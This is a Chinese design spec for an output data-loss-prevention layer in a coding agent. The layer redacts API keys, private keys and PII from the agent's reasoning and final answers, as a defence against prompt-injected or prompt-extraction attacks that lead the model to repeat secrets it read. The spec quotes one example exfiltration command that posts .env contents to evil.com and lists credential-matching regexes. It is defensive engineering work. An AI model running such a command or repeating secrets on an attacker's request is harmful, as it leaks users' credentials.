# L5 输出 DLP(分层脱敏引擎): Spec (M3)

**Date:** 2026-07-01
**Branch:** test-red-team
**Status:** PROPOSED
**里程碑:** 纵深防御路线图的 **M3**(L5)。M1(L4 权限闸门)、M2(L2 输入防御)已落地(test-red-team tip `e1cfb1a`)。后续 M4(L6 监控 + 数据流守卫)在各自 spec。

## Problem

M1 拦**工具执行**,M2 拦**输入门**。但还有一条外泄通道没堵:**Agent 主动产生的文本输出**。

威胁场景:
- **被诱导复述密钥**:LLM 用 `read_file`/`run_command` 读到 `.env`、`~/.ssh/id_rsa`,被诱导在 `结果` 段明文复述给用户(或攻击者)。
- **思考段泄露**:DeepSeek 推理文本(思考段)同样会打印 + 进 `messages` 历史,其中可能复述读到的敏感数据。
- **prompt-extraction 兜底**:即使 M2 漏判(攻击进了大脑),输出侧若不设防,system prompt / 内部配置仍可能被吐出。

工具观察段(`观察:`)是 Agent 的**输入数据**而非主动外泄——M2 已用 `<untrusted>` 标签防其注入大脑;脱敏掉它会破坏 coding 能力(read_file 读 .env 拿到 `[REDACTED]` 就没法工作了)。**L5 只守 LLM 主动产生的文本**(思考 + 结果),与 M2 输入侧对称。

> 命令执行时的网络外发(如 `curl evil.com -d $(cat .env)`)不是 L5 文本扫描的职责——那是 L4 出站 ask + L7 凭证不可达(`executor.py` 已剥离 env 密钥)的领域。L5 = 文本输出侧的脱敏展示。

## Goals

- **G1. 守住 LLM 主动产生的文本**:`思考`(推理)与 `结果`(最终答案)在 `print_*` 和 `messages.append` **之前**扫描脱敏。
- **G2. 分层检测,密钥优先**:
  - Layer A(密钥正则,零依赖,**永远生效**)——已知格式密钥:OpenAI `sk-`、AWS `AKIA`、GitHub `gh[pousr]_`/`github_pat_`、GitLab `glpat-`、Slack `xox[baprs]-`、Google `AIza`、PEM 私钥 header、JWT。
  - Layer B(Presidio PII,**可选**)——邮箱、中文手机号、身份证(带校验)、银行卡(Luhn)、姓名(NER,需 spacy 模型)。
- **G3. 脱敏而非阻断**:命中片段替换为 `[REDACTED:<type>]`(如 `[REDACTED:api_key]`),Agent 继续工作,不废掉整轮。
- **G4. 历史也脱敏**(切断二段泄露):`messages` 存脱敏版,下一轮 LLM 看不到该密钥 → 无法在后续结果里换编码复述。
- **G5. fail-soft 分层退化**:Presidio 不可用(导入失败/模型缺失)→ 自动只跑 Layer A(密钥仍护);Layer A 永不失败。
- **G6. 宁漏勿误**:不做"高熵串"泛化检测(base64 图片 / SHA256 / UUID / commit hash 会被误伤,破坏 coding)。只匹配**已知前缀/结构**。
- **G7. 静默脱敏 + 审计**:不在主输出加警告(4 段输出保持干净),命中落 `logs/l5.jsonl`(类型计数 + 文本长度,**绝不记明文**)。
- **G8. 杀手开关**:`l5.enabled=false` → 整层关闭,等价 M1+M2 baseline(便于红队对比)。

## Constraints(查证结论 / 用户拍板)

- **范围 = 密钥 + PII 都要**(用户拍板):密钥走 Layer A 正则;PII 走 Layer B Presidio + 中文 custom recognizer。两套统一在 `Layer.find(text)→[Finding]` 接口下,replace 逻辑共享。
- **扫描点 = 思考 + 结果**(用户拍板):工具观察段不扫(M2 已隔离;脱敏它破坏 coding)。
- **动作 = 脱敏 + 历史也脱敏**(用户拍板):`messages` 存脱敏版。代价:LLM 下一轮看不到该密钥(coding agent 用密钥应走 env 引用而非明文,这是好实践)。
- **依赖 = 分层 fail-soft**(用户拍板):`pip install -e '.[dlp]'` 才装 Presidio;不装也能跑(Layer A 护密钥)。与 M2"无 key 退化"完全对称。
- **脱敏格式 = `[REDACTED:type]`**(用户拍板):type 标签让 LLM 知道"这里有个密钥"但不泄值;天然幂等(`[REDACTED:...]` 不再匹配任何密钥模式)。
- **可见性 = 静默 + 审计**(用户拍板):不加屏幕警告,真实命中落审计。
- **依赖**:`pydantic`、`PyYAML` 已有;`presidio-analyzer` 进 optional `[dlp]` extra(spacy 是其传递依赖自动拉;**NER 模型不强制**——无模型时 Presidio 仍跑 regex recognizer,邮箱/手机/身份证大头仍覆盖)。`presidio-anonymizer` **不引入**——自己拿 analyzer 的 spans 做 replace,脱敏格式完全可控、依赖面最小。
- **红队归用户**:本 spec **不执行、不改动** `eval/`。M3 只交付实现 + 测试。
- **红队兼容性(关键)**:攻击诱导 Agent 读 .env 后在结果复述 key → L5 在 `print_result` 前 sanitize → wrapper `_extract_result` 提取到的是 `[REDACTED:api_key]` 而非明文 → judge 判"没泄露"= **hold ground**。与 M2 互补:M2 漏判时 L5 兜底。wrapper 无需改。
- **与 M1/M2 协同**:L4(执行)+ L2(输入)+ L5(输出)三层独立互补。L5 命中不阻断流程,只脱敏;L2/L4 各自仍生效。

## Design

### 单一脱敏流程

```
LLM 产出 content(思考 / 结果)
  → l5.scan(content):
      Layer A(KeyRegexLayer, 永远在)  ──┐
      Layer B(PresidioLayer, 可选)    ──┤ 合并 spans
                                         ↓
      倒序 replace 命中片段 → [REDACTED:type]
      返回 ScanOutcome(sanitized_text, findings, pii_active)
  → messages.append({..., "content": sanitized})   # G4 历史也脱敏
  → print_thought / print_result(sanitized)        # G1 屏幕也脱敏
```

### 命中动作(脱敏,非阻断)

- **替换不终止**:`[REDACTED:<type>]` 替换命中片段,Agent 继续 ReAct
- **历史也脱敏**:`assistant_msg["content"]` 存 sanitized 版(只动 `content` 字段,**不动 `tool_calls`**);下一轮 LLM 看不到明文 → 切断"思考读到 → 结果复述"的二段泄露
- **静默**:屏幕不出现"已脱敏"字样;`[REDACTED:api_key]` 自然嵌入输出
- **审计**:`logs/l5.jsonl` 记 `{ts, layer: l5, stage: thought|result, findings: {api_key: 2, email: 1}, text_len, pii_active}`,**只记类型计数与长度,不记明文、不记片段**

### 组件

| 文件 | 职责 |
|---|---|
| `cc_harness/l5.py`(新) | `Finding`(dataclass: start/end/type/score)、`Layer` 协议(`find(text)->list[Finding]`)、`KeyRegexLayer`(Layer A,密钥正则)、`PresidioLayer`(Layer B,可选,包装 `AnalyzerEngine`)、`L5Engine.scan(text)->ScanOutcome`、`ScanOutcome`(dataclass: sanitized_text/findings/pii_active)、`build_l5_engine(cfg)->L5Engine`(工厂,try-import Presidio,失败退化)、`sanitize(text, engine)->str`(便捷:engine 为 None 或 disabled 时原文直通) |
| `cc_harness/agent.py` | `run_turn` 加 `l5: L5Engine \| None = None` 参数;在 4 个 LLM-content 打印点前 sanitize(见下"接入点")。`assistant_msg` 只改 `content`,不动 `tool_calls` |
| `cc_harness/repl.py` | 构造 `l5 = build_l5_engine(load_l5_config(Path("policy.yaml")))`,thread 进 `run_turn(..., l5=l5)`。会话级单例 |
| `cc_harness/config.py` | `L5Config`(镜像 `L2Config` 模式):`enabled`、`keys_on`、`pii_on`,从 `policy.yaml` 的 `l5:` 段读(缺省全 True);`load_l5_config(path)` 只读 `raw.get("l5")` |
| `pyproject.toml` | `+ [project.optional-dependencies] dlp = ["presidio-analyzer>=2.2"]` |

### 接入点(`agent.py`,基于当前 `e1cfb1a` 行号)

LLM 产生的 `content` 在打印/入历史前过 `sanitize`。固定串(fallback/REFUSAL)不过:

| 点 | 行号(约) | 处理 |
|---|---|---|
| 思考段 | `print_thought(content)` L192 | sanitize `content` → append `assistant_msg["content"]=sanitized` + `print_thought(sanitized)` |
| 结果段(主) | `print_result(content)` L303 | sanitize → `messages.append({"role":"assistant","content":sanitized})` + `print_result(sanitized)` |
| max_iter 兜底 A | `print_result(content)` L175 | sanitize → 同上 |
| max_iter 兜底 B | `print_result(fallback)` L179 | 固定串,**不过**(无害) |
| max_iter 安全网 | `print_result(content)` L332 | sanitize → 同上 |

实现建议:封装 `async def _emit_text(...)` 太重(各点上下文不同);改为在每个点就地 `if l5 is not None: content = sanitize(content, l5)`(sanitize 内部已处理 disabled/None)。

### 检测器细节

**Layer A — `KeyRegexLayer`(零依赖,永远在)**

每条 `Pattern` 带 `type` 标签,用于 `[REDACTED:type]`:

| type | 正则(摘要) |
|---|---|
| `api_key` | `\b(sk-proj-|sk-)[A-Za-z0-9_-]{20,}` (OpenAI) |
| `aws_access_key` | `\bAKIA[0-9A-Z]{16}\b` |
| `github_token` | `\bgh[pousr]_[A-Za-z0-9]{36}\b`、`\bgithub_pat_[A-Za-z0-9_]{82}\b` |
| `gitlab_token` | `\bglpat-[A-Za-z0-9_-]{20}\b` |
| `slack_token` | `\bxox[baprs]-[A-Za-z0-9-]{10,}\b` |
| `google_api_key` | `\bAIza[0-9A-Za-z_-]{35}\b` |
| `private_key` | `-----BEGIN [A-Z ]*PRIVATE KEY-----` (含整块到 END,多行,用 DOTALL) |
| `jwt` | `\beyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*\b` |

**不做** 40 字 base64(AWS secret)、通用高熵串——误伤 SHA256/UUID/commit hash/base64 图片,破坏 coding。

**Layer B — `PresidioLayer`(可选)**

`build_l5_engine` 内 `try: from presidio_analyzer import AnalyzerEngine, Pattern, PatternRecognizer`:
- 导入/初始化任一失败 → `PresidioLayer=None`,`pii_active=False`,Layer A 仍生效。
- 成功 → 构造 `AnalyzerEngine`(默认 NLP engine;无 spacy 模型时 Presidio 自动降级 regex-only,不抛),注册内置 recognizer(EMAIL/PHONE 等英文)+ 中文 custom recognizer:
  - `CN_PHONE`:`\b1[3-9]\d{9}\b`
  - `CN_ID_CARD`:`\b[1-9]\d{5}(?:19|20)\d{2}(?:0[1-9]|1[0-2])(?:0[1-9]|[12]\d|3[01])\d{3}[\dXx]\b`
  - `BANK_CARD`:13-19 位 + Luhn 校验(在 recognizer 回调里验,非 Luhn 的长数字串不命中,避免误伤)
- `find(text)`:调 `analyzer.analyze(text, entities=[...], language="zh"|"en")` → 映射成 `Finding`,type 用小写下划线(`email`/`cn_phone`/`cn_id_card`/`bank_card`/`person`)。

**replace 策略**(L5Engine.scan 共用):合并两层 spans → 按 start 倒序 → 每段替换为 `[REDACTED:type]`。重叠 spans 取先到的(倒序保证索引不漂移)。

### 错误处理

- **Layer B 不可用**(导入失败/初始化失败,会话级一次):Layer A only,`pii_active=False`,审计记一条 `pii_unavailable`(不每次 scan 都记)。
- **scan 内部异常**(regex/Presidio 抛错):fail-open 返回**原文** + `findings={}`,审计记 `scan_error:<type>`(可用性优先,绝不阻塞输出——DLP 不能把 Agent 弄哑)。
- **L5 disabled**(`enabled=false`):`build_l5_engine` 返回 `None`,`sanitize` 原文直通,不审计,等价 M1+M2 baseline。
- **keys_on=false / pii_on=false**:对应 layer 不装(Layer A 也可关,便于红队隔离测)。

## Testing

- `tests/test_l5.py`:
  - `KeyRegexLayer`:各密钥格式命中(sk-/AKIA/ghp_/github_pat_/glpat-/PEM/JWT/AIza)+ **不误伤**(普通代码、base64 数据块、SHA256、UUID、commit hash、变量名 `sk_learn` 等)
  - `PresidioLayer`:monkeypatch `presidio_analyzer` import 失败 → `build_l5_engine` 退化 Layer A only、`pii_active=False`;import 成功(或 mock AnalyzerEngine)→ 邮箱/中文手机/身份证脱敏
  - `L5Engine.scan`:两 layer 合并、倒序 replace 索引不漂移、`[REDACTED:type]` 格式、**幂等**(sanitized 再 scan 不再命中)
  - `sanitize`:engine=None / disabled → 原文直通
  - 审计:命中落 `l5.jsonl`,断言**不含明文片段**(只记类型计数)
  - kill-switch:`enabled=false` → scan 原文直通
- 扩 `tests/test_agent.py`:mock L5Engine,断言思考段/结果段 `messages` 里 `content` 为 sanitized 版、`tool_calls` 未被动;`print_thought`/`print_result` 收到 sanitized 文本
- 扩 `tests/test_repl.py`:`build_l5_engine` 被调用、`l5` 传入 `run_turn`
- **红队衡量(用户自行跑,本 spec 不执行)**:M1+M2 baseline vs M1+M2+M3,看 prompt-extraction(兜底)+ 新增的"读 .env 复述"类攻击成功率下降

## 文件清单

```
新增  cc_harness/l5.py
新增  tests/test_l5.py
改    cc_harness/agent.py（run_turn +l5 参数;4 个 LLM-content 打印点 sanitize）
改    cc_harness/repl.py（构造 build_l5_engine + thread 进 run_turn）
改    cc_harness/config.py（+ L5Config + load_l5_config）
改    pyproject.toml（+ [dlp] optional extra）
改    policy.yaml.example（+ l5: 段）
改    CLAUDE.md（+ L5 设计决策段）
不动  eval/（红队归用户）
```

## 不在本 spec 范围

- **L6 监控 + 数据流守卫** — M4(消费 `l5.jsonl` 的脱敏事件做告警)。
- **工具观察段脱敏** — 明确不做(破坏 coding;M2 已用 `<untrusted>` 隔离其注入)。
- **`presidio-anonymizer`** — 不引入;自己拿 spans replace,格式可控、依赖最小。
- **强制 spacy NER 模型下载** — 可选;无模型时 regex-only 仍覆盖邮箱/手机/身份证。用户想要姓名 NER 再 `python -m spacy download en_core_web_sm`。
- **泛化"高熵串"密钥检测** — 明确不做(误伤正常代码)。
- 红队执行 / delta 脚本 — 用户自行处理。
